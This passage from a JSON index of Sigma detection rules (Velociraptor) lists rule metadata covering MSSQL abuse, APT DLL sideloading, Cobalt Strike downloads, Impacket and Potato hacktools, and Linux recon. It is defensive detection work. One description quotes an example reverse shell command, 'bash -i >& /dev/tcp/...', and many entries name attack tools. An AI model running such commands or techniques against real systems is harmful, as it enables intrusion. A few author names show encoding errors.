"attack.t1069.001", "attack.t1069.002", "attack.t1069", "attack.t1059.001"], "title": "Malicious PowerShell Commandlets - PoshModule"}, {"author": "Nasreddine Bencherchali (Nextron Systems)", "description": "Detects DLL load activity of known compromised DLLs used in by the compromised 3CXDesktopApp", "link": "https://github.com/Velocidex/velociraptor-sigma-rules/blob/master/rules\\emerging-threats\\2023\\TA\\3CX-Supply-Chain\\image_load_malware_3cx_compromise_susp_dll.yaml", "tags": ["attack.defense_evasion", "detection.emerging_threats", "windows", "evtx", "apt.3CX"], "title": "Malicious DLL Load By Compromised 3CXDesktopApp"}, {"author": "Nasreddine Bencherchali (Nextron Systems)", "description": "Detects DLL load activity of known compromised DLLs used in by the compromised 3CXDesktopApp", "link": "https://github.com/Velocidex/velociraptor-sigma-rules/blob/master/rules\\emerging-threats\\2023\\TA\\3CX-Supply-Chain\\image_load_pslist_malware_3cx_compromise_susp_dll.yaml", "tags": ["attack.defense_evasion", "detection.emerging_threats", "windows", "evtx", "apt.3CX"], "title": "Malicious DLL Load By Compromised 3CXDesktopApp"}, {"author": "Nasreddine Bencherchali (Nextron Systems)", "description": "Detects when the MSSQL \"xp_cmdshell\" stored procedure is used to execute commands", "link": "https://github.com/Velocidex/velociraptor-sigma-rules/blob/master/rules\\windows\\database\\mssqlserver\\win_mssql_xp_cmdshell_audit_log.yaml", "tags": ["attack.execution", "windows", "evtx", "database", "software.mssql"], "title": "MSSQL XPCmdshell Suspicious Execution"}, {"author": "Nasreddine Bencherchali (Nextron Systems)", "description": "Detects when the MSSQL \"xp_cmdshell\" stored procedure setting is changed", "link": "https://github.com/Velocidex/velociraptor-sigma-rules/blob/master/rules\\windows\\database\\mssqlserver\\win_mssql_xp_cmdshell_change.yaml", "tags": ["attack.execution", "windows", "evtx", "database", "software.mssql"], "title": "MSSQL XPCmdshell Option Change"}, {"author": "j4son", "description": "Detects failed logon attempts from clients with external network IP to an MSSQL server. This can be a sign of a bruteforce attack.", "link": "https://github.com/Velocidex/velociraptor-sigma-rules/blob/master/rules\\windows\\database\\mssqlserver\\win_mssql_failed_logon_from_external_network.yaml", "tags": ["attack.credential_access", "attack.t1110", "windows", "windows.evtx", "database", "software.mssql"], "title": "MSSQL Server Failed Logon From External Network"}, {"author": "Nasreddine Bencherchali (Nextron Systems), j4son", "description": "Detects failed logon attempts from clients to MSSQL server.", "link": "https://github.com/Velocidex/velociraptor-sigma-rules/blob/master/rules\\windows\\database\\mssqlserver\\win_mssql_failed_logon.yaml", "tags": ["attack.credential_access", "attack.t1110", "windows", "windows.evtx", "database", "software.mssql"], "title": "MSSQL Server Failed Logon"}, {"author": "Nasreddine Bencherchali (Nextron Systems)", "description": "Detects when the a stored procedure is set or cleared for automatic execution in MSSQL. A stored procedure that is set to automatic execution runs every time an instance of SQL Server is started", "link": "https://github.com/Velocidex/velociraptor-sigma-rules/blob/master/rules\\windows\\database\\mssqlserver\\win_mssql_sp_procoption_set.yaml", "tags": ["attack.persistence", "windows", "windows.evtx", "database", "software.mssql"], "title": "MSSQL SPProcoption Set"}, {"author": "Nasreddine Bencherchali (Nextron Systems)", "description": "Detects when an attacker calls the \"ALTER SERVER AUDIT\" or \"DROP SERVER AUDIT\" transaction in order to delete or disable audit logs on the server", "link": "https://github.com/Velocidex/velociraptor-sigma-rules/blob/master/rules\\windows\\database\\mssqlserver\\win_mssql_disable_audit_settings.yaml", "tags": ["attack.defense_evasion", "windows", "windows.evtx", "database", "software.mssql"], "title": "MSSQL Disable Audit Settings"}, {"author": "Nasreddine Bencherchali (Nextron Systems)", "description": "Detects when an attacker tries to backdoor the MSSQL server by adding a backdoor account to the sysadmin fixed server role", "link": "https://github.com/Velocidex/velociraptor-sigma-rules/blob/master/rules\\windows\\database\\mssqlserver\\win_mssql_add_sysadmin_account.yaml", "tags": ["attack.persistence", "windows", "windows.evtx", "database", "software.mssql"], "title": "MSSQL Add Account To Sysadmin Role"}, {"author": "Nasreddine Bencherchali (Nextron Systems)", "description": "Detects corrupted packets sent to the MSMQ service. Could potentially be a sign of CVE-2023-21554 exploitation", "link": "https://github.com/Velocidex/velociraptor-sigma-rules/blob/master/rules\\emerging-threats\\2023\\Exploits\\win_msmq_corrupted_packet.yaml", "tags": ["attack.execution", "detection.emerging_threats"], "title": "MSMQ Corrupted Packet Encountered"}, {"author": "Nasreddine Bencherchali (Nextron Systems)", "description": "Detects get requests to specific files used during the exploitation of MOVEit CVE-2023-34362", "link": "https://github.com/Velocidex/velociraptor-sigma-rules/blob/master/rules\\emerging-threats\\2023\\Exploits\\CVE-2023-34362-MOVEit-Transfer-Exploit\\web_cve_2023_34362_known_payload_request.yaml.yaml", "tags": ["cve.2023.34362", "detection.emerging_threats", "attack.persistence", "attack.t1505.003"], "title": "MOVEit CVE-2023-34362 Exploitation Attempt - Potential Web Shell Request"}, {"author": "@2xxeformyshirt (Security Risk Advisors) - rule; Teymur Kheirkhabarov (idea)", "description": "Detects MMC20.Application Lateral Movement; specifically looks for the spawning of the parent MMC.exe with a command line of \"-Embedding\" as a child of svchost.exe", "link": "https://github.com/Velocidex/velociraptor-sigma-rules/blob/master/rules\\windows\\lateral_movement\\dcom\\proc_creation_win_mmc_mmc20_lateral_movement.yaml", "tags": ["attack.execution", "attack.t1021.003", "attack.lateral_movement", "windows", "evtx"], "title": "MMC20 Lateral Movement"}, {"author": "Karneades, Swisscom CSIRT", "description": "Detects a Windows command line executable started from MMC", "link": "https://github.com/Velocidex/velociraptor-sigma-rules/blob/master/rules\\windows\\lateral_movement\\dcom\\proc_creation_win_mmc_susp_child_process.yaml", "tags": ["attack.lateral_movement", "attack.execution", "attack.t1021.003", "windows", "evtx"], "title": "MMC Spawning Windows Shell"}, {"author": "Mikhail Larin, oscd.community", "description": "Detect changes of syslog daemons configuration files", "link": "https://github.com/Velocidex/velociraptor-sigma-rules/blob/master/rules\\linux\\generic\\auditd\\lnx_auditd_logging_config_change.yaml", "tags": ["attack.defense_evasion", "attack.t1562.006", "os.linux"], "title": "Logging Configuration Changes on Linux Host"}, {"author": "Alejandro Ortuno, oscd.community", "description": "Detects enumeration of local systeam accounts. This information can help adversaries determine which local accounts exist on a system to aid in follow-on behavior.", "link": "https://github.com/Velocidex/velociraptor-sigma-rules/blob/master/rules\\linux\\generic\\process_creation\\proc_creation_lnx_local_account.yaml", "tags": ["attack.discovery", "attack.t1087.001", "os.linux"], "title": "Local System Accounts Discovery - Linux"}, {"author": "Florian Roth (Nextron Systems)", "description": "Detects the invocation of TabTip via CLSID as seen when JuicyPotatoNG is used on a system in brute force mode", "link": "https://github.com/Velocidex/velociraptor-sigma-rules/blob/master/rules\\windows\\malware\\potato_family\\win_system_lpe_indicators_tabtip.yaml", "tags": ["attack.execution", "attack.t1557.001", "windows", "evtx", "potato"], "title": "Local Privilege Escalation Indicator TabTip"}, {"author": "\u00c3\u2013mer G\u00c3\u00bcnal, Alejandro Ortuno, oscd.community", "description": "Detects enumeration of local system groups. Adversaries may attempt to find local system groups and permission settings", "link": "https://github.com/Velocidex/velociraptor-sigma-rules/blob/master/rules\\linux\\generic\\process_creation\\proc_creation_lnx_local_groups.yaml", "tags": ["attack.discovery", "attack.t1069.001", "os.linux"], "title": "Local Groups Discovery - Linux"}, {"author": "Pawel Mazur", "description": "Detects loading of kernel modules with insmod command.\nLoadable Kernel Modules (LKMs) are pieces of code that can be loaded and unloaded into the kernel upon demand.\nAdversaries may use LKMs to obtain persistence within the system or elevate the privileges.\n", "link": "https://github.com/Velocidex/velociraptor-sigma-rules/blob/master/rules\\linux\\generic\\auditd\\lnx_auditd_load_module_insmod.yaml", "tags": ["attack.persistence", "attack.privilege_escalation", "attack.t1547.006", "os.linux"], "title": "Loading of Kernel Module via Insmod"}, {"author": "Florian Roth (Nextron Systems), Nasreddine Bencherchali (Nextron Systems)", "description": "Detects suspicious sub processes of web server processes", "link": "https://github.com/Velocidex/velociraptor-sigma-rules/blob/master/rules\\linux\\generic\\process_creation\\proc_creation_lnx_webshell_detection.yaml", "tags": ["attack.persistence", "attack.t1505.003", "os.linux"], "title": "Linux Webshell Indicators"}, {"author": "Florian Roth (Nextron Systems)", "description": "Detects suspicious process command line that starts with a shell that executes something and finally gets piped into another shell", "link": "https://github.com/Velocidex/velociraptor-sigma-rules/blob/master/rules\\linux\\generic\\process_creation\\proc_creation_lnx_susp_pipe_shell.yaml", "tags": ["attack.defense_evasion", "attack.t1140", "os.linux"], "title": "Linux Shell Pipe to Shell"}, {"author": "Florian Roth (Nextron Systems)", "description": "Detects a bash contecting to a remote IP address (often found when actors do something like 'bash -i >& /dev/tcp/10.0.0.1/4242 0>&1')", "link": "https://github.com/Velocidex/velociraptor-sigma-rules/blob/master/rules\\linux\\generic\\network_connection\\net_connection_lnx_back_connect_shell_dev.yaml", "tags": ["attack.execution", "attack.t1059.004", "os.linux"], "title": "Linux Reverse Shell Indicator"}, {"author": "Alejandro Ortuno, oscd.community", "description": "Detects the enumeration of other remote systems.", "link": "https://github.com/Velocidex/velociraptor-sigma-rules/blob/master/rules\\linux\\generic\\process_creation\\proc_creation_lnx_remote_system_discovery.yaml", "tags": ["attack.discovery", "attack.t1018", "os.linux"], "title": "Linux Remote System Discovery"}, {"author": "Florian Roth (Nextron Systems)", "description": "Detects events with patterns found in commands used for reconnaissance on linux systems", "link": "https://github.com/Velocidex/velociraptor-sigma-rules/blob/master/rules\\linux\\generic\\process_creation\\proc_creation_lnx_susp_recon_indicators.yaml", "tags": ["attack.reconnaissance", "attack.t1592.004", "attack.credential_access", "attack.t1552.001", "os.linux"], "title": "Linux Recon Indicators"}, {"author": "Tuan Le (NCSGroup), Nasreddine Bencherchali (Nextron Systems)", "description": "Detects linux package removal using builtin tools such as \"yum\", \"apt\", \"apt-get\" or \"dpkg\".", "link": "https://github.com/Velocidex/velociraptor-sigma-rules/blob/master/rules\\linux\\generic\\process_creation\\proc_creation_lnx_remove_package.yaml", "tags": ["attack.defense_evasion", "attack.t1070", "os.linux"], "title": "Linux Package Uninstall"}, {"author": "Alejandro Ortuno, oscd.community, Georg Lauenstein (sure[secure])", "description": "Detects execution of network scanning and reconnaisance tools. These tools can be used for the enumeration of local or remote network services for example.", "link": "https://github.com/Velocidex/velociraptor-sigma-rules/blob/master/rules\\linux\\generic\\process_creation\\proc_creation_lnx_susp_network_utilities_execution.yaml", "tags": ["attack.discovery", "attack.t1046", "os.linux"], "title": "Linux Network Service Scanning Tools Execution"}, {"author": "Alejandro Ortuno, oscd.community", "description": "Detects enumeration of local or remote network services.", "link": "https://github.com/Velocidex/velociraptor-sigma-rules/blob/master/rules\\linux\\generic\\auditd\\lnx_auditd_network_service_scanning.yaml", "tags": ["attack.discovery", "attack.t1046", "os.linux"], "title": "Linux Network Service Scanning - Auditd"}, {"author": "Pawel Mazur", "description": "Detect attempt to enable auditing of TTY input", "link": "https://github.com/Velocidex/velociraptor-sigma-rules/blob/master/rules\\linux\\generic\\auditd\\lnx_auditd_keylogging_with_pam_d.yaml", "tags": ["attack.credential_access", "attack.t1003", "attack.t1056.001", "os.linux"], "title": "Linux Keylogging with Pam.d"}, {"author": "Nasreddine Bencherchali (Nextron Systems), Georg Lauenstein (sure[secure])", "description": "Detects known hacktool execution based on image name.", "link": "https://github.com/Velocidex/velociraptor-sigma-rules/blob/master/rules\\linux\\generic\\process_creation\\proc_creation_lnx_susp_hktl_execution.yaml", "tags": ["attack.execution", "attack.resource_development", "attack.t1587", "os.linux"], "title": "Linux HackTool Execution"}, {"author": "Sittikorn S, Teoderick Contreras", "description": "Detects the doas tool execution in linux host platform. This utility tool allow standard users to perform tasks as root, the same way sudo does.", "link": "https://github.com/Velocidex/velociraptor-sigma-rules/blob/master/rules\\linux\\generic\\process_creation\\proc_creation_lnx_doas_execution.yaml", "tags": ["attack.privilege_escalation", "attack.t1548", "os.linux"], "title": "Linux Doas Tool Execution"}, {"author": "Sittikorn S, Teoderick Contreras", "description": "Detects the creation of doas.conf file in linux host platform.", "link": "https://github.com/Velocidex/velociraptor-sigma-rules/blob/master/rules\\linux\\generic\\file_event\\file_event_lnx_doas_conf_creation.yaml", "tags": ["attack.privilege_escalation", "attack.t1548", "os.linux"], "title": "Linux Doas Conf File Creation"}, {"author": "Florian Roth (Nextron Systems)", "description": "Detects process connections to a Monero crypto mining pool", "link": "https://github.com/Velocidex/velociraptor-sigma-rules/blob/master/rules\\linux\\generic\\network_connection\\net_connection_lnx_crypto_mining_indicators.yaml", "tags": ["attack.impact", "attack.t1496", "os.linux"], "title": "Linux Crypto Mining Pool Connections"}, {"author": "Florian Roth (Nextron Systems)", "description": "Detects command line parameters or strings often used by crypto miners", "link": "https://github.com/Velocidex/velociraptor-sigma-rules/blob/master/rules\\linux\\generic\\process_creation\\proc_creation_lnx_crypto_mining.yaml", "tags": ["attack.impact", "attack.t1496", "os.linux"], "title": "Linux Crypto Mining Indicators"}, {"author": "Pawel Mazur", "description": "Detects attempts to discover the files with setuid/setgid capability on them. That would allow adversary to escalate their privileges.", "link": "https://github.com/Velocidex/velociraptor-sigma-rules/blob/master/rules\\linux\\generic\\auditd\\lnx_auditd_capabilities_discovery.yaml", "tags": ["attack.collection", "attack.privilege_escalation", "attack.t1123", "attack.t1548", "os.linux"], "title": "Linux Capabilities Discovery"}, {"author": "Nasreddine Bencherchali (Nextron Systems)", "description": "Detects the presence of a base64 version of the shebang in the commandline, which could indicate a malicious payload about to be decoded", "link": "https://github.com/Velocidex/velociraptor-sigma-rules/blob/master/rules\\linux\\generic\\process_creation\\proc_creation_lnx_base64_shebang_cli.yaml", "tags": ["attack.defense_evasion", "attack.t1140", "os.linux"], "title": "Linux Base64 Encoded Shebang In CLI"}, {"author": "pH-T (Nextron Systems)", "description": "Detects suspicious process command line that uses base64 encoded input for execution with a shell", "link": "https://github.com/Velocidex/velociraptor-sigma-rules/blob/master/rules\\linux\\generic\\process_creation\\proc_creation_lnx_base64_execution.yaml", "tags": ["attack.defense_evasion", "attack.t1140", "os.linux"], "title": "Linux Base64 Encoded Pipe to Shell"}, {"author": "Thurein Oo, Nasreddine Bencherchali (Nextron Systems)", "description": "Detects sideloading of trojanized DLLs used in Lazarus APT campaign in the case of a Spanish aerospace company", "link": "https://github.com/Velocidex/velociraptor-sigma-rules/blob/master/rules\\emerging-threats\\2023\\TA\\Lazarus\\image_load_apt_lazarus_side_load_activity_evtx.yaml", "tags": ["attack.defense_evasion", "attack.privilege_escalation", "attack.t1574.001", "attack.t1574.002", "attack.g0032", "detection.emerging_threats", "windows", "evtx", "sysmon"], "title": "Lazarus APT DLL Sideloading Activity - EVTX"}, {"author": "Thurein Oo, Nasreddine Bencherchali (Nextron Systems)", "description": "Detects sideloading of trojanized DLLs used in Lazarus APT campaign in the case of a Spanish aerospace company", "link": "https://github.com/Velocidex/velociraptor-sigma-rules/blob/master/rules\\emerging-threats\\2023\\TA\\Lazarus\\image_load_apt_lazarus_side_load_activity.yaml", "tags": ["attack.defense_evasion", "attack.privilege_escalation", "attack.t1574.001", "attack.t1574.002", "attack.g0032", "detection.emerging_threats", "windows", "evtx", "sysmon"], "title": "Lazarus APT DLL Sideloading Activity"}, {"author": "Nasreddine Bencherchali (Nextron Systems)", "description": "Detects a PowerShell script used by Lace Tempest APT to launch their malware loader by exploiting CVE-2023-47246 as reported by SysAid Team\n", "link": "https://github.com/Velocidex/velociraptor-sigma-rules/blob/master/rules\\emerging-threats\\2023\\TA\\Lace-Tempest\\posh_ps_apt_lace_tempest_malware_launcher.yaml", "tags": ["attack.execution", "attack.t1059.001", "detection.emerging_threats"], "title": "Lace Tempest PowerShell Launcher"}, {"author": "Nasreddine Bencherchali (Nextron Systems)", "description": "Detects a PowerShell script used by Lace Tempest APT to erase evidence from victim servers by exploiting CVE-2023-47246 as reported by SysAid Team\n", "link": "https://github.com/Velocidex/velociraptor-sigma-rules/blob/master/rules\\emerging-threats\\2023\\TA\\Lace-Tempest\\posh_ps_apt_lace_tempest_eraser_script.yaml", "tags": ["attack.execution", "attack.t1059.001", "detection.emerging_threats"], "title": "Lace Tempest PowerShell Evidence Eraser"}, {"author": "Nasreddine Bencherchali (Nextron Systems)", "description": "Detects execution of a specific binary based on filename and hash used by Lace Tempest to load additional malware as reported by SysAid Team", "link": "https://github.com/Velocidex/velociraptor-sigma-rules/blob/master/rules\\emerging-threats\\2023\\TA\\Lace-Tempest\\proc_creation_win_apt_lace_tempest_loader_execution_evtx.yaml", "tags": ["attack.execution", "detection.emerging_threats", "windows", "evtx"], "title": "Lace Tempest Malware Loader Execution - EVTX"}, {"author": "Nasreddine Bencherchali (Nextron Systems)", "description": "Detects execution of a specific binary based on filename and hash used by Lace Tempest to load additional malware as reported by SysAid Team", "link": "https://github.com/Velocidex/velociraptor-sigma-rules/blob/master/rules\\emerging-threats\\2023\\TA\\Lace-Tempest\\proc_creation_win_apt_lace_tempest_loader_execution.yaml", "tags": ["attack.execution", "detection.emerging_threats", "windows"], "title": "Lace Tempest Malware Loader Execution"}, {"author": "Nasreddine Bencherchali (Nextron Systems)", "description": "Detects PowerShell script file creation with specific names or suffixes which was seen being used often in PowerShell scripts by FIN7", "link": "https://github.com/Velocidex/velociraptor-sigma-rules/blob/master/rules\\emerging-threats\\2023\\TA\\Lace-Tempest\\file_event_win_apt_lace_tempest_indicators.yaml", "tags": ["attack.execution", "detection.emerging_threats", "windows", "evtx"], "title": "Lace Tempest File Indicators"}, {"author": "Nasreddine Bencherchali (Nextron Systems)", "description": "Detects specific command line execution used by Lace Tempest to download Cobalt Strike as reported by SysAid Team", "link": "https://github.com/Velocidex/velociraptor-sigma-rules/blob/master/rules\\emerging-threats\\2023\\TA\\Lace-Tempest\\proc_creation_win_apt_lace_tempest_cobalt_strike_download_evtx.yaml", "tags": ["attack.execution", "detection.emerging_threats", "windows", "evtx"], "title": "Lace Tempest Cobalt Strike Download - EVTX"}, {"author": "Nasreddine Bencherchali (Nextron Systems)", "description": "Detects specific command line execution used by Lace Tempest to download Cobalt Strike as reported by SysAid Team", "link": "https://github.com/Velocidex/velociraptor-sigma-rules/blob/master/rules\\emerging-threats\\2023\\TA\\Lace-Tempest\\proc_creation_win_apt_lace_tempest_cobalt_strike_download.yaml", "tags": ["attack.execution", "detection.emerging_threats", "windows", "evtx"], "title": "Lace Tempest Cobalt Strike Download"}, {"author": "Nasreddine Bencherchali (Nextron Systems)", "description": "Detects specific command line execution used by Lace Tempest to download Cobalt Strike as reported by SysAid Team", "link": "https://github.com/Velocidex/velociraptor-sigma-rules/blob/master/rules\\windows\\malware\\cobalt_strike\\powershell\\proc_creation_win_apt_lace_tempest_cobalt_strike_download.yaml", "tags": ["attack.execution", "detection.emerging_threats", "windows", "evtx", "cobalt_strike"], "title": "Lace Tempest Cobalt Strike Download"}, {"author": "Nasreddine Bencherchali (Nextron Systems)", "description": "Detects specific command line execution used by Lace Tempest to download Cobalt Strike as reported by SysAid Team", "link": "https://github.com/Velocidex/velociraptor-sigma-rules/blob/master/rules\\windows\\malware\\cobalt_strike\\powershell\\sysmon_proc_creation_win_apt_lace_tempest_cobalt_strike_download.yaml", "tags": ["attack.execution", "detection.emerging_threats", "sysmon", "windows", "evtx", "cobalt_strike"], "title": "Lace Tempest Cobalt Strike Download"}, {"author": "Florian Roth (Nextron Systems)", "description": "Detects suspicious command sequence that JexBoss", "link": "https://github.com/Velocidex/velociraptor-sigma-rules/blob/master/rules\\linux\\generic\\builtin\\lnx_susp_jexboss.yaml", "tags": ["attack.execution", "attack.t1059.004", "os.linux"], "title": "JexBoss Command Sequence"}, {"author": "Thomas Patzke", "description": "Detects execution of ntdsutil.exe, which can be used for various attacks against the NTDS database (NTDS.DIT)", "link": "https://github.com/Velocidex/velociraptor-sigma-rules/blob/master/rules\\windows\\privilege_escalation\\ntds_dit\\proc_creation_win_ntdsutil_usage.yaml", "tags": ["attack.credential_access", "attack.t1003.003", "windows", "evtx"], "title": "Invocation of Active Directory Diagnostic Tool (ntdsutil.exe)"}, {"author": "Thomas Patzke", "description": "Detects execution of ntdsutil.exe, which can be used for various attacks against the NTDS database (NTDS.DIT)", "link": "https://github.com/Velocidex/velociraptor-sigma-rules/blob/master/rules\\windows\\privilege_escalation\\ntds_dit\\sysmon_proc_creation_win_ntdsutil_usage.yaml", "tags": ["attack.credential_access", "attack.t1003.003", "sysmon", "windows", "evtx"], "title": "Invocation of Active Directory Diagnostic Tool (ntdsutil.exe)"}, {"author": "Florian Roth (Nextron Systems)", "description": "Detects suspicious interactive bash as a parent to rather uncommon child processes", "link": "https://github.com/Velocidex/velociraptor-sigma-rules/blob/master/rules\\linux\\generic\\process_creation\\proc_creation_lnx_susp_interactive_bash.yaml", "tags": ["attack.execution", "attack.defense_evasion", "attack.t1059.004", "attack.t1036", "os.linux"], "title": "Interactive Bash Suspicious Children"}, {"author": "\u00c3\u2013mer G\u00c3\u00bcnal, oscd.community", "description": "Detects installation of new certificate on the system which attackers may use to avoid warnings when connecting to controlled web servers or C2s", "link": "https://github.com/Velocidex/velociraptor-sigma-rules/blob/master/rules\\linux\\generic\\process_creation\\proc_creation_lnx_install_root_certificate.yaml", "tags": ["attack.defense_evasion", "attack.t1553.004", "os.linux"], "title": "Install Root Certificate"}, {"author": "Nasreddine Bencherchali (Nextron Systems)", "description": "Detects scenarios where system auditing for important events such as \"Process Creation\" or \"Logon\" events is disabled.", "link": "https://github.com/Velocidex/velociraptor-sigma-rules/blob/master/rules\\windows\\tampering\\evtx\\win_security_disable_event_auditing_critical.yaml", "tags": ["attack.defense_evasion", "attack.t1562.002", "windows", "evtx"], "title": "Important Windows Event Auditing Disabled"}, {"author": "Bhabesh Raj", "description": "Detects execution of Impacket's psexec.py.", "link": "https://github.com/Velocidex/velociraptor-sigma-rules/blob/master/rules\\windows\\malware\\impacket\\win_security_impacket_psexec.yaml", "tags": ["attack.lateral_movement", "attack.t1021.002", "attack.execution", "windows", "evtx", "impacket"], "title": "Impacket PsExec Execution"}, {"author": "Nasreddine Bencherchali (Nextron Systems)", "description": "Detects RunDLL32.exe executing a single digit DLL named \"1.dll\" with the export function \"DllRegisterServer\". This behaviour was often seen used by malware and especially IcedID", "link": "https://github.com/Velocidex/velociraptor-sigma-rules/blob/master/rules\\windows\\malware\\IcedID\\proc_creation_win_malware_icedid_rundll32_dllregisterserver_evtx.yaml", "tags": ["attack.defense_evasion", "attack.t1218.011", "detection.emerging_threats", "windows", "malware.icedid", "evtx"], "title": "IcedID Malware Suspicious Single Digit DLL Execution Via Rundll32 - EVTX"}, {"author": "Nasreddine Bencherchali (Nextron Systems)", "description": "Detects RunDLL32.exe executing a single digit DLL named \"1.dll\" with the export function \"DllRegisterServer\". This behaviour was often seen used by malware and especially IcedID", "link": "https://github.com/Velocidex/velociraptor-sigma-rules/blob/master/rules\\windows\\malware\\IcedID\\proc_creation_win_malware_icedid_rundll32_dllregisterserver.yaml", "tags": ["attack.defense_evasion", "attack.t1218.011", "detection.emerging_threats", "windows", "malware.icedid"], "title": "IcedID Malware Suspicious Single Digit DLL Execution Via Rundll32"}, {"author": "Florian Roth (Nextron Systems)", "description": "Detects suspicious IIS native-code module installations via command line", "link": "https://github.com/Velocidex/velociraptor-sigma-rules/blob/master/rules\\windows\\web_exploitation\\iis\\sysmon_proc_creation_win_iis_appcmd_susp_module_install.yaml", "tags": ["attack.persistence", "attack.t1505.003", "sysmon", "windows", "evtx", "webserver.iis"], "title": "IIS Native-Code Module Command Line Installation"}, {"author": "Florian Roth (Nextron Systems)", "description": "Detects events in which a history file gets deleted, e.g. the ~/bash_history to remove traces of malicious activity", "link": "https://github.com/Velocidex/velociraptor-sigma-rules/blob/master/rules\\linux\\generic\\process_creation\\proc_creation_lnx_susp_history_delete.yaml", "tags": ["attack.impact", "attack.t1565.001", "os.linux"], "title": "History File Deletion"}, {"author": "Pawel Mazur", "description": "Detects adversary creating hidden file or directory, by detecting directories or files with . as the first character", "link": "https://github.com/Velocidex/velociraptor-sigma-rules/blob/master/rules\\linux\\generic\\auditd\\lnx_auditd_hidden_files_directories.yaml", "tags": ["attack.defense_evasion", "attack.t1564.001", "os.linux"], "title": "Hidden Files and Directories"}, {"author": "Nasreddine Bencherchali (Nextron Systems)", "description": "Detects the execution of PowerShell with a specific flag sequence that is used by the Wmiexec script", "link": "https://github.com/Velocidex/velociraptor-sigma-rules/blob/master/rules\\windows\\malware\\impacket\\proc_creation_win_hktl_wmiexec_default_powershell.yaml", "tags": ["attack.defense_evasion", "attack.lateral_movement", "attack.execution", "windows", "evtx", "impacket"], "title": "HackTool - Wmiexec Default Powershell Command"}, {"author": "frack113", "description": "Adversaries may use Valid Accounts to log into a computer using the Remote Desktop Protocol (RDP). The adversary may then perform actions as the logged-on user.", "link": "https://github.com/Velocidex/velociraptor-sigma-rules/blob/master/rules\\windows\\lateral_movement\\remote_powershell\\proc_creation_win_hktl_evil_winrm.yaml", "tags": ["attack.lateral_movement", "attack.t1021.006", "windows", "evtx"], "title": "HackTool - WinRM Access Via Evil-WinRM"}, {"author": "Christian Burkard (Nextron Systems), Florian Roth (Nextron Systems)", "description": "Detects the execution of the hacktool Rubeus using specific command line flags", "link": "https://github.com/Velocidex/velociraptor-sigma-rules/blob/master/rules\\windows\\generic\\powershell\\posh_ps_hktl_rubeus.yaml", "tags": ["attack.credential_access", "attack.t1003", "attack.t1558.003", "attack.lateral_movement", "attack.t1550.003", "windows", "evtx", "generic", "powershell"], "title": "HackTool - Rubeus Execution - ScriptBlock"}, {"author": "Ecco, oscd.community, Jonhnathan Ribeiro, Tim Rauch", "description": "Detects wmiexec/dcomexec/atexec/smbexec from Impacket framework", "link": "https://github.com/Velocidex/velociraptor-sigma-rules/blob/master/rules\\windows\\malware\\impacket\\proc_creation_win_hktl_impacket_lateral_movement.yaml", "tags": ["attack.execution", "attack.t1047", "attack.lateral_movement", "attack.t1021.003", "windows", "evtx", "impacket"], "title": "HackTool - Potential Impacket Lateral Movement Activity"}, {"author": "Olaf Hartong, Florian Roth (Nextron Systems), Aleksey Potapov, oscd.community", "description": "Detects a potential remote threat creation with certain characteristics which are typical for Cobalt Strike beacons", "link": "https://github.com/Velocidex/velociraptor-sigma-rules/blob/master/rules\\windows\\malware\\cobalt_strike\\injection\\create_remote_thread_win_hktl_cobaltstrike.yaml", "tags": ["attack.defense_evasion", "attack.t1055.001", "sysmon", "windows", "evtx", "cobalt_strike"], "title": "HackTool - Potential CobaltStrike Process Injection"}, {"author": "Nasreddine Bencherchali (Nextron Systems)", "description": "Detects the execution of the LocalPotato POC based on basic PE metadata information and default CLI examples", "link": "https://github.com/Velocidex/velociraptor-sigma-rules/blob/master/rules\\windows\\malware\\potato_family\\proc_creation_win_hktl_localpotato.yaml", "tags": ["attack.defense_evasion", "attack.privilege_escalation", "cve.2023.21746", "windows", "evtx", "potato"], "title": "HackTool - LocalPotato Execution"}, {"author": "Nasreddine Bencherchali (Nextron Systems)", "description": "Detects the execution of the LocalPotato POC based on basic PE metadata information and default CLI examples", "link": "https://github.com/Velocidex/velociraptor-sigma-rules/blob/master/rules\\windows\\malware\\potato_family\\sysmon_proc_creation_win_hktl_localpotato.yaml", "tags": ["attack.defense_evasion", "attack.privilege_escalation", "cve.2023.21746", "sysmon", "windows", "evtx", "potato"], "title": "HackTool - LocalPotato Execution"}, {"author": "Florian Roth (Nextron Systems)", "description": "Detects KrbRelayUp used to perform a universal no-fix local privilege escalation in Windows domain environments where LDAP signing is not enforced", "link": "https://github.com/Velocidex/velociraptor-sigma-rules/blob/master/rules\\windows\\privilege_escalation\\kerberos\\proc_creation_win_hktl_krbrelayup.yaml", "tags": ["attack.credential_access", "attack.t1558.003", "attack.lateral_movement", "attack.t1550.003", "windows", "evtx"], "title": "HackTool - KrbRelayUp Execution"}, {"author": "Florian Roth (Nextron Systems)", "description": "Detects the use of KrbRelay, a Kerberos relaying tool", "link": "https://github.com/Velocidex/velociraptor-sigma-rules/blob/master/rules\\windows\\privilege_escalation\\kerberos\\proc_creation_win_hktl_krbrelay.yaml", "tags": ["attack.credential_access", "attack.t1558.003", "windows", "evtx"], "title": "HackTool - KrbRelay Execution"}, {"author": "Florian Roth (Nextron Systems)", "description": "Detects the execution of different compiled Windows binaries of the impacket toolset (based on names or part of their names - could lead to false positives)", "link": "https://github.com/Velocidex/velociraptor-sigma-rules/blob/master/rules\\windows\\malware\\impacket\\proc_creation_win_hktl_impacket_tools.yaml", "tags": ["attack.execution", "attack.t1557.001", "attack.lateral_movement", "windows", "evtx", "impacket"], "title": "HackTool - Impacket Tools Execution"}, {"author": "Florian Roth (Nextron Systems)", "description": "Detects the pattern of a pipe name as used by the hack tool EfsPotato", "link": "https://github.com/Velocidex/velociraptor-sigma-rules/blob/master/rules\\windows\\malware\\potato_family\\sysmon_pipe_created_hktl_efspotato.yaml", "tags": ["attack.defense_evasion", "attack.privilege_escalation", "attack.t1055", "sysmon", "windows", "evtx", "potato"], "title": "HackTool - EfsPotato Named Pipe Creation"}, {"author": "Thomas Patzke", "description": "Detects various execution patterns of the CrackMapExec pentesting framework", "link": "https://github.com/Velocidex/velociraptor-sigma-rules/blob/master/rules\\windows\\malware\\crackmapexec\\proc_creation_win_crackmapexec_execution_patterns.yaml", "tags": ["attack.execution", "attack.t1047", "attack.t1053", "attack.t1059.003", "attack.t1059.001", "attack.s0106", "windows", "evtx", "sysmon"], "title": "HackTool - CrackMapExec Execution Patterns"}, {"author": "Florian Roth (Nextron Systems), Jonhnathan Ribeiro, oscd.community", "description": "Detects suspicious command lines used in Covenant luanchers", "link": "https://github.com/Velocidex/velociraptor-sigma-rules/blob/master/rules\\windows\\malware\\covenant\\proc_creation_win_hktl_covenant.yaml", "tags": ["attack.execution", "attack.defense_evasion", "attack.t1059.001", 